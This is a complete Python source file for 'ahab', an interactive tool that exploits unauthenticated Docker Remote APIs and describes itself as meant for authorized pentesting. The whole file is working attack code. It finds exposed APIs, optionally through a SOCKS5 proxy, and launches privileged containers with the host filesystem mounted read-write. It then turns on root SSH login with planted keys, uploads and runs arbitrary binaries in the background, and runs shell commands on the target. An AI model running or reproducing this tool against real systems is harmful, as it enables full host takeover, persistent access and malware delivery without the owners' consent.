#!/usr/bin/env python3
"""
ahab - Interactive Docker Remote API exploitation tool for authorized pentesting.

Connects to unauthenticated Docker APIs (optionally via SOCKS5 proxy), enumerates
images, deploys privileged containers with host FS mounted RW, sets up SSH access,
and executes operator-supplied binaries.
"""

import argparse
import io
import json
import os
import readline
import subprocess
import sys
import tarfile
import tempfile
import time

import urllib3

try:
    import requests
except ImportError:
    print("[!] Missing dependency: requests", file=sys.stderr)
    print("[!] Install with: uv pip install .", file=sys.stderr)
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PREFERRED_OS = ["ubuntu", "debian"]
DEPRIORITIZED_OS = ["alpine", "nixos"]
DEFAULT_PORTS = [(2375, "http"), (2376, "https")]

BANNER = r"""
    .
   ":"
 ___:____     |"\/"|
,' `. \    \  / . . \
|  \___|   (__\_____/)
\_________ |        |
 `--------` \      /
             |    |
             |    |

   Ahab v2.0 - The Whale Hunter
   Docker Remote API Exploitation Tool
"""


# ---------------------------------------------------------------------------
# Logging helpers
# ---------------------------------------------------------------------------


def info(msg: str) -> None:
    print(f"[*] {msg}")


def success(msg: str) -> None:
    print(f"[+] {msg}")


def warn(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)


def error(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------


def make_tar(name: str, data: bytes, mode: int = 0o755) -> bytes:
    """Build an in-memory tar archive containing a single file."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        tinfo = tarfile.TarInfo(name=name)
        tinfo.size = len(data)
        tinfo.mode = mode
        tar.addfile(tinfo, io.BytesIO(data))
    buf.seek(0)
    return buf.read()


def generate_ssh_keypair() -> tuple[str, str]:
    """Generate a temporary SSH keypair. Returns (private_key_path, public_key_path)."""
    key_dir = tempfile.mkdtemp(prefix="ahab_ssh_")
    priv_path = os.path.join(key_dir, "id_rsa")
    pub_path = priv_path + ".pub"

    info(f"Generating SSH keypair in {key_dir} ...")
    result = subprocess.run(
        ["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", priv_path, "-N", "", "-q"],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        error(f"ssh-keygen failed: {result.stderr.strip()}")
        sys.exit(1)

    success("SSH keypair generated:")
    info(f"  Private key: {priv_path}")
    info(f"  Public key:  {pub_path}")
    return priv_path, pub_path


def format_size(size_bytes: float | None) -> str:
    if size_bytes is None:
        return "?"
    for unit in ("B", "KB", "MB", "GB"):
        if size_bytes < 1024:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f} TB"


def categorize_images(images: list[dict]) -> tuple[list[dict], list[dict], list[dict]]:
    """Sort images into preferred / acceptable / deprioritized buckets."""
    preferred, acceptable, deprioritized = [], [], []
    for img in images:
        tags = img.get("RepoTags") or []
        tags_lower = " ".join(tags).lower()
        if any(os_name in tags_lower for os_name in PREFERRED_OS):
            preferred.append(img)
        elif any(os_name in tags_lower for os_name in DEPRIORITIZED_OS):
            deprioritized.append(img)
        else:
            acceptable.append(img)
    return preferred, acceptable, deprioritized


# ---------------------------------------------------------------------------
# Docker API Client
# ---------------------------------------------------------------------------


class DockerAPI:
    """Wrapper around the Docker Remote API using raw HTTP requests."""

    def __init__(self, base_url: str, proxy_url: str | None = None, timeout: int = 15):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        if proxy_url:
            self.session.proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }
        self.session.verify = False

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    def _get(self, path: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", self.timeout)
        return self.session.get(self._url(path), **kwargs)

    def _post(self, path: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", self.timeout)
        return self.session.post(self._url(path), **kwargs)

    def _put(self, path: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", self.timeout)
        return self.session.put(self._url(path), **kwargs)

    def _delete(self, path: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", self.timeout)
        return self.session.delete(self._url(path), **kwargs)

    def ping(self) -> bool:
        resp = self._get("/_ping")
        if resp.status_code == 200:
            return True
        if resp.status_code in (401, 403):
            return False
        resp.raise_for_status()
        return False

    def version(self) -> dict:
        resp = self._get("/version")
        resp.raise_for_status()
        return resp.json()

    def info(self) -> dict:
        resp = self._get("/info")
        resp.raise_for_status()
        return resp.json()

    def list_networks(self) -> list[dict]:
        resp = self._get("/networks")
        resp.raise_for_status()
        return resp.json()

    def list_images(self) -> list[dict]:
        resp = self._get("/images/json")
        resp.raise_for_status()
        return resp.json()

    def pull_image(self, image: str, tag: str = "latest") -> None:
        resp = self._post(
            "/images/create",
            params={"fromImage": image, "tag": tag},
            stream=True,
            timeout=300,
        )
        resp.raise_for_status()
        last_status = ""
        for line in resp.iter_lines():
            if line:
                try:
                    msg = json.loads(line)
                    status = msg.get("status", "")
                    if status != last_status:
                        info(f"  Pull: {status}")
                        last_status = status
                    if "error" in msg:
                        raise RuntimeError(msg["error"])
                except json.JSONDecodeError:
                    pass

    def create_container(self, config: dict) -> str:
        resp = self._post("/containers/create", json=config)
        resp.raise_for_status()
        return resp.json()["Id"]

    def start_container(self, container_id: str) -> None:
        resp = self._post(f"/containers/{container_id}/start")
        if resp.status_code == 304:
            info("Container already running")
            return
        resp.raise_for_status()

    def inspect_container(self, container_id: str) -> dict:
        resp = self._get(f"/containers/{container_id}/json")
        resp.raise_for_status()
        return resp.json()

    def upload_archive(self, container_id: str, path: str, tar_data: bytes) -> None:
        resp = self._put(
            f"/containers/{container_id}/archive",
            params={"path": path},
            data=tar_data,
            headers={"Content-Type": "application/x-tar"},
        )
        resp.raise_for_status()

    def exec_create(self, container_id: str, cmd: str | list[str], detach: bool = False) -> str:
        config = {
            "AttachStdout": not detach,
            "AttachStderr": not detach,
            "Tty": False,
            "Cmd": cmd if isinstance(cmd, list) else ["/bin/sh", "-c", cmd],
        }
        resp = self._post(f"/containers/{container_id}/exec", json=config)
        resp.raise_for_status()
        return resp.json()["Id"]

    def exec_start(self, exec_id: str, detach: bool = False, stream: bool = False) -> str | requests.Response:
        resp = self._post(
            f"/exec/{exec_id}/start",
            json={"Detach": detach, "Tty": False},
            stream=stream,
            timeout=300,
        )
        resp.raise_for_status()
        if detach:
            return ""
        if stream:
            return resp
        return resp.text

    def exec_run(self, container_id: str, cmd: str | list[str], detach: bool = False) -> str:
        exec_id = self.exec_create(container_id, cmd, detach=detach)
        return self.exec_start(exec_id, detach=detach)

    def exec_stream(self, container_id: str, cmd: str | list[str]) -> str:
        """Create + start an exec with streaming output."""
        exec_id = self.exec_create(container_id, cmd)
        resp = self.exec_start(exec_id, stream=True)
        output = ""
        for chunk in resp.iter_content(chunk_size=4096):
            if not chunk:
                continue
            text = chunk.decode("utf-8", errors="replace") if isinstance(chunk, bytes) else chunk
            clean = "".join(ch for ch in text if ch in ("\n", "\r", "\t") or (32 <= ord(ch) < 127))
            if clean:
                sys.stdout.write(clean)
                sys.stdout.flush()
                output += clean
        return output

    def list_containers(self, all: bool = False) -> list[dict]:
        resp = self._get("/containers/json", params={"all": all})
        resp.raise_for_status()
        return resp.json()

    def stop_container(self, container_id: str, timeout: int = 10) -> None:
        resp = self._post(
            f"/containers/{container_id}/stop",
            params={"t": timeout},
            timeout=timeout + 5,
        )
        if resp.status_code == 304:
            return
        resp.raise_for_status()

    def remove_container(self, container_id: str, force: bool = False) -> None:
        resp = self._delete(
            f"/containers/{container_id}",
            params={"force": force},
        )
        resp.raise_for_status()


# ---------------------------------------------------------------------------
# Port Discovery
# ---------------------------------------------------------------------------


def discover_api(target: str, proxy_url: str | None = None, override_port: int | None = None) -> DockerAPI | None:
    """Try to find an open, unauthenticated Docker API on the target."""
    if override_port:
        scheme = "https" if override_port == 2376 else "http"
        ports = [(override_port, scheme)]
    else:
        ports = DEFAULT_PORTS

    for port, scheme in ports:
        base_url = f"{scheme}://{target}:{port}"
        info(f"Trying {base_url} ...")
        api = DockerAPI(base_url, proxy_url)
        try:
            if api.ping():
                ver = api.version()
                success(
                    f"Docker API open on {base_url} - "
                    f"Docker {ver.get('Version', '?')}, "
                    f"API {ver.get('ApiVersion', '?')}, "
                    f"OS: {ver.get('Os', '?')}/{ver.get('Arch', '?')}"
                )
                return api
            warn(f"  {base_url} - authentication required, skipping")
        except requests.exceptions.SSLError as exc:
            warn(f"  {base_url} - SSL error: {exc}")
        except requests.exceptions.ConnectionError:
            warn(f"  {base_url} - connection refused / unreachable")
        except requests.exceptions.Timeout:
            warn(f"  {base_url} - connection timed out")
        except requests.exceptions.RequestException as exc:
            warn(f"  {base_url} - request error: {exc}")

    return None


# ---------------------------------------------------------------------------
# Display Functions
# ---------------------------------------------------------------------------


def display_images(preferred: list[dict], acceptable: list[dict], deprioritized: list[dict]) -> list[dict]:
    """Print categorized image list and return flat ordered list."""
    ordered: list[dict] = []
    idx = 1

    def print_section(label: str, imgs: list[dict], marker: str = "") -> None:
        nonlocal idx
        if not imgs:
            return
        print(f"\n  --- {label} ---")
        for img in imgs:
            tags = ", ".join(img.get("RepoTags") or ["<untagged>"])
            short_id = img["Id"].replace("sha256:", "")[:12]
            size = format_size(img.get("Size"))
            suffix = f"  {marker}" if marker else ""
            print(f"  [{idx}] {tags}  ({short_id}, {size}){suffix}")
            ordered.append(img)
            idx += 1

    print_section("Preferred (Ubuntu/Debian)", preferred)
    print_section("Other", acceptable)
    print_section("Deprioritized (Alpine/NixOS)", deprioritized, marker="[!]")

    return ordered


def display_registry_config(api: DockerAPI) -> None:
    info("Querying daemon registry configuration ...")
    try:
        daemon_info = api.info()
    except requests.exceptions.RequestException as exc:
        warn(f"Could not retrieve daemon info: {exc}")
        return

    reg_config = daemon_info.get("RegistryConfig", {})
    mirrors = reg_config.get("Mirrors") or []
    index_configs = reg_config.get("IndexConfigs", {})
    insecure_cidrs = reg_config.get("InsecureRegistryCIDRs") or []

    print("\n  --- Registry Configuration ---")

    if mirrors:
        print("  Mirrors:")
        for m in mirrors:
            print(f"    - {m}")
    else:
        print("  Mirrors: (none - pulls go directly to each registry)")

    if index_configs:
        print("  Known registries:")
        for name, cfg in index_configs.items():
            official = cfg.get("Official", False)
            secure = cfg.get("Secure", True)
            flags = []
            if official:
                flags.append("official")
            if not secure:
                flags.append("INSECURE")
            flag_str = f"  ({', '.join(flags)})" if flags else ""
            print(f"    - {name}{flag_str}")

    if insecure_cidrs:
        print("  Insecure registry CIDRs:")
        for cidr in insecure_cidrs:
            print(f"    - {cidr}")

    has_mirror = len(mirrors) > 0
    if has_mirror:
        info("Pulls for Docker Hub images will be routed through the mirror(s) above.")
    else:
        info("Unqualified image names (e.g. 'ubuntu:latest') pull from Docker Hub (docker.io).")
    info("To pull from a specific registry, use the full name (e.g. 'registry.example.com/library/ubuntu:latest').")
    print()


def display_networks(api: DockerAPI) -> None:
    info("Enumerating Docker networks ...")
    try:
        networks = api.list_networks()
    except requests.exceptions.RequestException as exc:
        warn(f"Could not retrieve networks: {exc}")
        return

    print("\n  --- Docker Networks ---")
    for net in networks:
        name = net.get("Name", "?")
        driver = net.get("Driver", "?")
        scope = net.get("Scope", "?")
        net_id = net.get("Id", "")[:12]

        ipam_configs = net.get("IPAM", {}).get("Config") or []
        subnet_parts = []
        for cfg in ipam_configs:
            subnet = cfg.get("Subnet", "")
            gateway = cfg.get("Gateway", "")
            if subnet:
                part = subnet
                if gateway:
                    part += f", gw {gateway}"
                subnet_parts.append(part)
        subnet_str = " | ".join(subnet_parts) if subnet_parts else "no subnet"

        containers = net.get("Containers", {})
        num_containers = len(containers) if containers else 0

        print(
            f"    {name:20s}  driver={driver:10s}  scope={scope:6s}  "
            f"{subnet_str}  ({num_containers} containers)  [{net_id}]"
        )
    print()


# ---------------------------------------------------------------------------
# Container Deployment
# ---------------------------------------------------------------------------


def deploy_container(api: DockerAPI, image: str, host_port: int | None = None) -> tuple[str | None, dict | None]:
    """Create and start a privileged container with host FS mounted."""
    info(f"Creating container from {image} ...")
    host_config: dict = {
        "Binds": ["/:/host:rw"],
        "NetworkMode": "bridge",
        "Privileged": True,
    }
    config: dict = {
        "Image": image,
        "Cmd": ["/bin/sh", "-c", "while true; do sleep 3600; done"],
        "Tty": True,
        "OpenStdin": True,
        "HostConfig": host_config,
    }
    if host_port:
        config["ExposedPorts"] = {"22/tcp": {}}
        host_config["PortBindings"] = {"22/tcp": [{"HostPort": str(host_port)}]}

    container_id = api.create_container(config)
    short_id = container_id[:12]
    success(f"Container created: {short_id}")

    info("Starting container ...")
    api.start_container(container_id)

    time.sleep(1)
    inspect_data = api.inspect_container(container_id)
    state = inspect_data.get("State", {})
    if not state.get("Running"):
        error(f"Container is not running. State: {json.dumps(state, indent=2)}")
        return None, None

    success("Container is running")
    return container_id, inspect_data


def get_container_networks(inspect_data: dict) -> dict[str, str]:
    """Extract all network name->IP mappings from inspect data."""
    networks = inspect_data.get("NetworkSettings", {}).get("Networks", {})
    result: dict[str, str] = {}
    for net_name, net_info in networks.items():
        ip = net_info.get("IPAddress")
        if ip:
            result[net_name] = ip
    return result


# ---------------------------------------------------------------------------
# SSH Setup
# ---------------------------------------------------------------------------


def setup_ssh(api: DockerAPI, container_id: str, ssh_key_path: str) -> None:
    info("Installing openssh-server (streaming output) ...")
    output = api.exec_stream(
        container_id,
        "apt-get update && apt-get install -y openssh-server 2>&1",
    )
    if "E: " in output:
        warn("apt-get reported errors (see output above)")
    else:
        success("openssh-server installed")

    info("Configuring sshd ...")
    api.exec_run(container_id, "mkdir -p /root/.ssh /run/sshd")
    api.exec_run(
        container_id,
        "sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config"
        " && sed -i 's/#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config",
    )

    info("Deploying SSH public key ...")
    with open(ssh_key_path, "rb") as f:
        key_data = f.read()
    tar_data = make_tar("authorized_keys", key_data, mode=0o600)
    api.upload_archive(container_id, "/root/.ssh", tar_data)
    success("SSH key deployed")

    info("Starting sshd ...")
    api.exec_run(container_id, "/usr/sbin/sshd")
    success("sshd started")


# ---------------------------------------------------------------------------
# Binary Upload & Execute
# ---------------------------------------------------------------------------


def deploy_binary(api: DockerAPI, container_id: str, binary_path: str) -> None:
    binary_name = os.path.basename(binary_path)
    info(f"Uploading binary: {binary_name} ...")

    with open(binary_path, "rb") as f:
        binary_data = f.read()

    tar_data = make_tar(binary_name, binary_data, mode=0o755)
    api.upload_archive(container_id, "/tmp", tar_data)
    success(f"Binary uploaded to /tmp/{binary_name}")

    info(f"Executing /tmp/{binary_name} (detached) ...")
    api.exec_run(
        container_id,
        f"chmod +x /tmp/{binary_name} && nohup /tmp/{binary_name} &",
        detach=True,
    )
    success(f"Binary launched in background: /tmp/{binary_name}")


# ---------------------------------------------------------------------------
# Interactive Shell - Command Handlers
# ---------------------------------------------------------------------------


def cmd_help(_api: DockerAPI, _args: list[str]) -> None:
    print("""
  commands:
    containers                          List all containers (running + stopped)
    images                              List available images (categorized)
    registries                          Show registry configuration
    networks                            Show Docker networks
    deploy <image> [-p <port>]          Deploy a privileged container
    inspect <container_id>              Show detailed info for a container
    ssh-keys <container_id> [key_path]  Push SSH keys (auto-generates if no path)
    exec <container_id> <binary_path>   Upload and execute a binary (detached)
    shell <container_id> <command>      Execute a command inside a container
    netcheck <container_id>             Test internet connectivity from container
    rm <container_id>                   Stop and remove a container
    help                                Show this help
    exit / quit                         Exit the shell
""")


def cmd_containers(api: DockerAPI, _args: list[str]) -> None:
    try:
        containers = api.list_containers(all=True)
    except requests.exceptions.RequestException as exc:
        error(f"Failed to list containers: {exc}")
        return

    if not containers:
        info("No containers found.")
        return

    print(f"\n  {'ID':<14s} {'IMAGE':<40s} {'STATUS':<20s} {'IP(S)'}")
    print(f"  {'-' * 14} {'-' * 40} {'-' * 20} {'-' * 30}")
    for c in containers:
        cid = c.get("Id", "")[:12]
        image = c.get("Image", "?")
        if len(image) > 38:
            image = image[:35] + "..."
        status = c.get("Status", c.get("State", "?"))

        net_settings = c.get("NetworkSettings", {}).get("Networks", {})
        ips = []
        for net_name, net_info in net_settings.items():
            ip = net_info.get("IPAddress")
            if ip:
                ips.append(f"{net_name}:{ip}")
        ip_str = ", ".join(ips) if ips else "-"

        print(f"  {cid:<14s} {image:<40s} {status:<20s} {ip_str}")
    print()


def cmd_images(api: DockerAPI, _args: list[str]) -> None:
    images = api.list_images()
    preferred, acceptable, deprioritized = categorize_images(images)
    total = len(preferred) + len(acceptable) + len(deprioritized)
    info(
        f"Found {total} image(s) - {len(preferred)} preferred, "
        f"{len(acceptable)} other, {len(deprioritized)} deprioritized"
    )
    if total > 0:
        display_images(preferred, acceptable, deprioritized)
    print()


def cmd_registries(api: DockerAPI, _args: list[str]) -> None:
    display_registry_config(api)


def cmd_networks(api: DockerAPI, _args: list[str]) -> None:
    display_networks(api)


def cmd_deploy(api: DockerAPI, args: list[str]) -> None:
    host_port = None
    filtered_args = []
    i = 0
    while i < len(args):
        if args[i] == "-p" and i + 1 < len(args):
            try:
                host_port = int(args[i + 1])
            except ValueError:
                warn(f"Invalid port: {args[i + 1]}")
                return
            i += 2
        else:
            filtered_args.append(args[i])
            i += 1

    if not filtered_args:
        image_input = input("[?] Image to deploy (e.g. ubuntu:latest): ").strip()
        if not image_input:
            warn("No image specified.")
            return
    else:
        image_input = filtered_args[0]

    if host_port is None:
        port_input = input("[?] Host port to map container SSH (port 22) to (e.g. 2222, blank to skip): ").strip()
        if port_input:
            try:
                host_port = int(port_input)
            except ValueError:
                warn(f"Invalid port: {port_input}")
                return

    try:
        local_images = api.list_images()
    except requests.exceptions.RequestException:
        local_images = []

    found = any(image_input in (img.get("RepoTags") or []) for img in local_images)

    if not found:
        warn(f"Image '{image_input}' not found locally.")
        choice = input("[?] Pull it? [Y/n]: ").strip().lower()
        if choice in ("", "y", "yes"):
            if ":" in image_input:
                img_name, tag = image_input.rsplit(":", 1)
            else:
                img_name, tag = image_input, "latest"
                image_input = f"{img_name}:{tag}"
            try:
                warn("Pulling generates network traffic and may trigger alerts.")
                api.pull_image(img_name, tag)
                success(f"Pulled {image_input}")
            except Exception as exc:
                error(f"Pull failed: {exc}")
                return
        else:
            info("Deploy cancelled.")
            return

    container_id, inspect_data = deploy_container(api, image_input, host_port=host_port)
    if container_id is None:
        error("Container failed to start.")
        return

    container_nets = get_container_networks(inspect_data)

    print(f"\n  Container ID : {container_id[:12]}")
    if container_nets:
        print("  Networks:")
        for net_name, net_ip in container_nets.items():
            print(f"    {net_name:20s} -> {net_ip}")
    if host_port:
        print(f"  Port mapping : 0.0.0.0:{host_port} -> 22/tcp")
    print(f"  Image        : {image_input}")
    print("  Host FS      : /host (read-write)")
    print("  Privileged   : yes")
    print()
    info(f"Use 'ssh-keys {container_id[:12]}' to set up SSH access.")
    if host_port:
        info(f"After ssh-keys, connect with: ssh root@<target_ip> -p {host_port}")
    info(f"Use 'exec {container_id[:12]} <binary>' to upload and run a payload.")


def cmd_inspect(api: DockerAPI, args: list[str]) -> None:
    if not args:
        warn("Usage: inspect <container_id>")
        return

    cid = args[0]
    try:
        data = api.inspect_container(cid)
    except requests.exceptions.HTTPError as exc:
        if exc.response is not None and exc.response.status_code == 404:
            error(f"Container not found: {cid}")
        else:
            error(f"Inspect failed: {exc}")
        return
    except requests.exceptions.RequestException as exc:
        error(f"Inspect failed: {exc}")
        return

    short_id = data.get("Id", "")[:12]
    name = data.get("Name", "").lstrip("/")
    image = data.get("Config", {}).get("Image", "?")
    state = data.get("State", {})
    status = state.get("Status", "?")
    started = state.get("StartedAt", "?")
    pid = state.get("Pid", "?")
    mounts = data.get("Mounts", [])
    container_nets = get_container_networks(data)

    print(f"\n  ID           : {short_id}")
    print(f"  Name         : {name}")
    print(f"  Image        : {image}")
    print(f"  Status       : {status}")
    print(f"  PID          : {pid}")
    print(f"  Started      : {started}")

    if container_nets:
        print("  Networks:")
        for net_name, net_ip in container_nets.items():
            print(f"    {net_name:20s} -> {net_ip}")

    if mounts:
        print("  Mounts:")
        for m in mounts:
            src = m.get("Source", "?")
            dst = m.get("Destination", "?")
            rw = "rw" if m.get("RW", False) else "ro"
            print(f"    {src} -> {dst} ({rw})")

    privileged = data.get("HostConfig", {}).get("Privileged", False)
    print(f"  Privileged   : {privileged}")
    print()


def cmd_ssh_keys(api: DockerAPI, args: list[str]) -> None:
    if not args:
        warn("Usage: ssh-keys <container_id> [path_to_public_key]")
        return

    cid = args[0]
    key_path = args[1] if len(args) > 1 else None
    priv_path = None

    if key_path:
        if not os.path.isfile(key_path):
            error(f"Key file not found: {key_path}")
            return
    else:
        priv_path, key_path = generate_ssh_keypair()

    try:
        setup_ssh(api, cid, key_path)
    except requests.exceptions.HTTPError as exc:
        if exc.response is not None and exc.response.status_code == 404:
            error(f"Container not found: {cid}")
        else:
            error(f"SSH setup failed: {exc}")
        return
    except requests.exceptions.RequestException as exc:
        error(f"SSH setup failed: {exc}")
        return

    try:
        data = api.inspect_container(cid)
        container_nets = get_container_networks(data)
        primary_ip = next(iter(container_nets.values()), "<container_ip>")
        port_bindings = data.get("HostConfig", {}).get("PortBindings") or {}
        ssh_bindings = port_bindings.get("22/tcp") or []
        host_port = ssh_bindings[0].get("HostPort") if ssh_bindings else None
    except Exception:
        primary_ip = "<container_ip>"
        host_port = None

    identity = f" -i {priv_path}" if priv_path else ""
    if host_port:
        target_host = api.base_url.split("://")[1].rsplit(":")[0]
        success(f"SSH ready: ssh{identity} root@{target_host} -p {host_port}")
    else:
        success(f"SSH ready (container-internal only): ssh{identity} root@{primary_ip}")
        warn("No host port mapping for 22/tcp. SSH only reachable from the Docker host.")


def cmd_exec(api: DockerAPI, args: list[str]) -> None:
    if len(args) < 2:
        warn("Usage: exec <container_id> <binary_path>")
        return

    cid = args[0]
    binary_path = args[1]

    if not os.path.isfile(binary_path):
        error(f"Binary not found: {binary_path}")
        return

    try:
        deploy_binary(api, cid, binary_path)
    except requests.exceptions.HTTPError as exc:
        if exc.response is not None and exc.response.status_code == 404:
            error(f"Container not found: {cid}")
        else:
            error(f"Exec failed: {exc}")
    except requests.exceptions.RequestException as exc:
        error(f"Exec failed: {exc}")


def cmd_shell(api: DockerAPI, args: list[str]) -> None:
    if len(args) < 2:
        warn("Usage: shell <container_id> <command ...>")
        return

    cid = args[0]
    cmd = " ".join(args[1:])

    try:
        output = api.exec_stream(cid, cmd)
    except requests.exceptions.HTTPError as exc:
        if exc.response is not None and exc.response.status_code == 404:
            error(f"Container not found: {cid}")
        else:
            error(f"Exec failed: {exc}")
        return
    except requests.exceptions.RequestException as exc:
        error(f"Exec failed: {exc}")
        return

    if output and not output.endswith("\n"):
        print()


def cmd_netcheck(api: DockerAPI, args: list[str]) -> None:
    if not args:
        warn("Usage: netcheck <container_id>")
        return

    cid = args[0]

    try:
        api.inspect_container(cid)
    except requests.exceptions.HTTPError as exc:
        if exc.response is not None and exc.response.status_code == 404:
            error(f"Container not found: {cid}")
        else:
            error(f"Failed: {exc}")
        return
    except requests.exceptions.RequestException as exc:
        error(f"Failed: {exc}")
        return

    info("Testing DNS resolution (google.com) ...")
    dns_output = api.exec_run(
        cid,
        "cat /etc/resolv.conf 2>/dev/null; echo '---'; "
        "getent hosts google.com 2>&1 || nslookup google.com 2>&1 || echo 'DNS_FAIL'",
    )
    if "DNS_FAIL" in dns_output and "google.com" not in dns_output:
        warn("DNS resolution failed")
        print(f"  {dns_output.strip()}")
    else:
        success("DNS resolution works")
        for line in dns_output.split("\n"):
            line = line.strip()
            if line and "---" not in line and not line.startswith(("#", "nameserver", "search", "options", "domain")):
                print(f"    {line}")

    info("Testing HTTP connectivity (http://connectivitycheck.gstatic.com/generate_204) ...")
    http_output = api.exec_run(
        cid,
        "curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 "
        "http://connectivitycheck.gstatic.com/generate_204 2>&1 "
        "|| wget -q --spider --timeout=5 http://connectivitycheck.gstatic.com/generate_204 "
        "&& echo '200' || echo 'HTTP_FAIL'",
    )
    http_code = http_output.strip()
    if http_code in ("204", "200"):
        success(f"HTTP connectivity works (status {http_code})")
    else:
        warn(f"HTTP connectivity failed: {http_code}")

    info("Testing ICMP (ping 8.8.8.8) ...")
    ping_output = api.exec_run(cid, "ping -c 1 -W 3 8.8.8.8 2>&1 || echo 'PING_FAIL'")
    if "PING_FAIL" in ping_output or "100% packet loss" in ping_output:
        warn("ICMP ping failed (may be blocked by firewall - not necessarily a problem)")
    else:
        success("ICMP ping works")

    info("Default route:")
    route_output = api.exec_run(cid, "ip route show default 2>/dev/null || route -n 2>/dev/null | head -5")
    if route_output.strip():
        for line in route_output.strip().split("\n"):
            print(f"    {line}")
    else:
        warn("Could not retrieve route table")


def cmd_rm(api: DockerAPI, args: list[str]) -> None:
    if not args:
        warn("Usage: rm <container_id>")
        return

    cid = args[0]

    try:
        data = api.inspect_container(cid)
        short_id = data.get("Id", "")[:12]
        image = data.get("Config", {}).get("Image", "?")
    except requests.exceptions.HTTPError as exc:
        if exc.response is not None and exc.response.status_code == 404:
            error(f"Container not found: {cid}")
        else:
            error(f"Failed: {exc}")
        return
    except requests.exceptions.RequestException as exc:
        error(f"Failed: {exc}")
        return

    confirm = input(f"[?] Remove container {short_id} ({image})? [y/N]: ").strip().lower()
    if confirm not in ("y", "yes"):
        info("Cancelled.")
        return

    try:
        info(f"Stopping {short_id} ...")
        api.stop_container(cid)
    except Exception:
        pass

    try:
        info(f"Removing {short_id} ...")
        api.remove_container(cid)
        success(f"Container {short_id} removed.")
    except requests.exceptions.RequestException as exc:
        error(f"Remove failed: {exc}")


# ---------------------------------------------------------------------------
# Interactive Shell - Main Loop
# ---------------------------------------------------------------------------

COMMANDS: dict[str, callable] = {
    "help": cmd_help,
    "containers": cmd_containers,
    "images": cmd_images,
    "registries": cmd_registries,
    "networks": cmd_networks,
    "deploy": cmd_deploy,
    "inspect": cmd_inspect,
    "ssh-keys": cmd_ssh_keys,
    "exec": cmd_exec,
    "shell": cmd_shell,
    "netcheck": cmd_netcheck,
    "rm": cmd_rm,
}


def _setup_completer() -> None:
    all_commands = [*COMMANDS.keys(), "exit", "quit"]

    def completer(text: str, state: int) -> str | None:
        matches = [c for c in all_commands if c.startswith(text.lower())]
        if state < len(matches):
            return matches[state]
        return None

    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t")


def interactive_shell(api: DockerAPI, target: str) -> None:
    _setup_completer()

    print()
    print("=" * 60)
    print(f"  ahab - connected to {target}")
    print("  Type 'help' for available commands.")
    print("=" * 60)
    print()

    while True:
        try:
            line = input(f"ahab ({target})> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            info("Exiting.")
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0].lower()
        cmd_args = parts[1:]

        if cmd in ("exit", "quit"):
            info("Exiting.")
            break

        handler = COMMANDS.get(cmd)
        if handler is None:
            warn(f"Unknown command: {cmd}. Type 'help' for available commands.")
            continue

        try:
            handler(api, cmd_args)
        except KeyboardInterrupt:
            print()
            warn("Command interrupted.")
        except Exception as exc:
            error(f"Command error: {exc}")


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Ahab - Interactive Docker Remote API exploitation tool (authorized pentesting)",
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target IP address or hostname",
    )
    parser.add_argument(
        "--proxy",
        default=None,
        help="SOCKS5 proxy URL (e.g. socks5h://127.0.0.1:1080)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Override port (skip auto-discovery of 2375/2376)",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    args = parse_args(argv)

    print(BANNER)

    info(f"Target: {args.target}")
    if args.proxy:
        info(f"Proxy:  {args.proxy}")
    else:
        info("Proxy:  none (direct connection)")

    api = discover_api(args.target, args.proxy, override_port=args.port)
    if api is None:
        error("No open Docker API found on target. Exiting.")
        sys.exit(1)

    interactive_shell(api, args.target)


if __name__ == "__main__":
    main()
